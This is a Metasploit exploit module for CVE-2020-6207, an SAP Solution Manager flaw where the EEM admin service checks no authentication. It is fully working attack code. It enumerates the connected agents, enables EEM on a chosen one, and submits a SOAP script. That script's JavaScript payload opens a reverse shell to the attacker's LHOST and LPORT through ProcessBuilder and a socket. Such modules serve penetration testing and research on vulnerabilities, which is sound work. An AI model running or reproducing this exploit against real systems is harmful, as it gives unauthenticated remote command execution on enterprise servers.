##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::SapSolManEemMissAuth

  @agents = Array.new # Array of connected agents

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAP Solution Manager remote unauthorized OS commands execution',
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
            'Pablo Artuso', # @lmkalg The researcher who originally found this vulnerability
            'Dmitry Chastuhin', # @chipik The researcher who made first PoC
            'Vladimir Ivanov' # @_generic_human_ This Metasploit module
          ],
        'Description' => %q{
          This module exploits the CVE-2020-6207 vulnerability within the SAP EEM servlet (tc~smd~agent~application~eem) of
          SAP Solution Manager (SolMan) running version 7.2. The vulnerability occurs due to missing authentication
          checks when submitting a SOAP request to the /EemAdminService/EemAdmin page to get information about connected SMDAgents,
          send HTTP request (SSRF) and execute OS command on connected SMDAgent. Works stable in connected SMDAgent with Java version 1.8.

          Successful exploitation will allow unauthenticated remote attackers to get reverse shell from connected to the SolMan
          agent as the user under which it runs SMDAgent service, usually daaadm.
        },
        'References' =>
          [
            ['CVE', '2020-6207'],
            ['URL', 'https://i.blackhat.com/USA-20/Wednesday/us-20-Artuso-An-Unauthenticated-Journey-To-Root-Pwning-Your-Companys-Enterprise-Software-Servers-wp.pdf'],
            ['URL', 'https://github.com/chipik/SAP_EEM_CVE-2020-6207']
          ],
        'Privileged' => false,
        'DefaultOptions' => {
          'Payload' => 'generic/shell_reverse_tcp'
        },
        'Platform' => 'java',
        'Arch' => ARCH_JAVA,
        'Targets' => [ ['Automatic', {}] ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2020-10-03'
      )
    )

    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('TARGETURI', [true, 'Path to the SAP Solution Manager EemAdmin page from the web root', '/EemAdminService/EemAdmin']),
        OptString.new('AGENT', [true, 'Agent server name for exploitation', 'agent_server_name']),
      ]
    )
    self.class.agents = Array.new
  end

  class << self
    attr_reader :agents
  end

  class << self
    attr_writer :agents
  end

  def setup_variables
    @host = datastore['RHOSTS']
    @port = datastore['RPORT']
    @lhost = datastore['LHOST'] || '0.0.0.0'
    @lport = datastore['LPORT'] || 4444
    @path = datastore['TARGETURI']

    @agent_name = datastore['AGENT']
    @script_name = Rex::Text.rand_text_alphanumeric(12)

    if datastore['SSL']
      @schema = 'https://'
    else
      @schema = 'http://'
    end

    @solman_uri = "#{@schema}#{@host}:#{@port}#{@path}"
  end

  # Analyze runtime error message from SAP Solution Manager client
  def analyze_error(error_message)
    case error_message
    when 'The server not responding'
      fail_with(Failure::Unreachable, 'The server not responding.')
    when 'Bad response status code'
      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response status code not in the expected status code: 200. The target is likely patched.')
    when 'Response content type is not text/xml'
      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected content type: text/xml. The target is likely patched.')
    when 'Failed to parse response body'
      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body not in the expected format. The target is likely patched.')
    when 'Response body does not contain a SOAP body'
      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body does not contain a SOAP body. The target is likely patched.')
    when 'Response body contains errors'
      fail_with(Failure::UnexpectedReply, 'The server sent a response, but the response body contains errors.')
    else
      fail_with(Failure::UnexpectedReply, 'The server did not respond in the expected manner.')
    end
  end

  # Report Service and Vulnerability
  def report_service_and_vuln
    report_service(
      host: @host,
      port: @port,
      name: 'soap',
      proto: 'tcp',
      info: 'SAP Solution Manager'
    )
    report_vuln(
      host: @host,
      port: @port,
      name: name,
      refs: references
    )
  end

  # Check current agent in agents list
  def check_agent(agent_name)
    if self.class.agents.empty?
      begin
        print_status("Getting a list of agents connected to the Solution Manager: #{@host}")
        self.class.agents = make_agents_array
        vprint_good("Connected agents list: \n#{pretty_agents_table(self.class.agents)}")
      rescue RuntimeError => e
        print_error("Failed to make the list of connected agents on the SAP Solution Manager page at #{@solman_uri}")
        vprint_error("Error #{e.class}: #{e}")
        analyze_error(e.message)
      end
    end

    if agent_name.nil?
      fail_with(Failure::NoTarget, "Please set agent: `set AGENT #{self.class.agents[0]['serverName']}`")
    end

    self.class.agents.each do |agent|
      if agent_name == agent[:serverName]
        return true
      end
    end
    false
  end

  # Make reverse shell payload xml
  def make_reverse_shell_payload(interpreter)
    command = "var p = new Packages.java.lang.ProcessBuilder('#{interpreter}').redirectErrorStream(true).start();"
    command << "var s= new Packages.java.net.Socket('#{@lhost}',#{@lport});"
    command << 'var pi=new Packages.java.io.BufferedInputStream(p.getInputStream());'
    command << 'var pe= new Packages.java.io.BufferedInputStream(p.getErrorStream());'
    command << 'var si= new Packages.java.io.BufferedInputStream(s.getInputStream());'
    command << 'var po= new Packages.java.io.BufferedOutputStream(p.getOutputStream());'
    command << 'var so= new Packages.java.io.BufferedOutputStream(s.getOutputStream());'
    command << 'while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());'
    command << 'while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());'
    command << 'so.flush();po.flush();Packages.java.lang.Thread.sleep(50);}};p.destroy();s.close();'
    make_rce_payload(command)
  end

  # Get agent OS by agent server name
  def get_agent_os(agent_name)
    self.class.agents.each do |agent|
      if agent_name == agent[:serverName]
        return agent[:osName]
      end
    end
    nil
  end

  def check
    setup_variables
    begin
      self.class.agents = make_agents_array
    rescue RuntimeError
      return Exploit::CheckCode::Safe
    end
    if self.class.agents.empty?
      print_status("Solution Manager server: #{@host}:#{@port} is vulnerable but no agents connected!")
    else
      print_good("Connected agents list: \n#{pretty_agents_table(self.class.agents)}")
    end
    report_service_and_vuln
    Exploit::CheckCode::Vulnerable
  end

  def exploit
    setup_variables
    unless check_agent(@agent_name)
      fail_with(Failure::BadConfig, "Not found agent: #{@agent_name} in connected agents: \n#{pretty_agents_table(self.class.agents)}")
    end
    report_service_and_vuln
    agent_os = get_agent_os(@agent_name) || 'Unknown OS'
    case agent_os
    when /windows/i
      interpreter = 'cmd.exe'
    else
      interpreter = '/bin/sh'
    end

    print_status("Agent: #{@agent_name}")
    print_status("OS: #{agent_os}")
    print_status("Interpreter: #{interpreter}")

    payload = make_reverse_shell_payload(interpreter)
    begin
      print_status("Enable EEM on agent: #{@agent_name}")
      enable_eem(@agent_name)

      print_status("Start script: #{@script_name} with RCE payload on agent: #{@agent_name}")
      send_soap_request(make_soap_body(@agent_name, @script_name, payload))
    rescue RuntimeError => e
      print_error("Failed to execution on agent: #{@agent_name}")
      vprint_error("Error #{e.class}: #{e}")
      analyze_error(e.message)
    end
  end

end
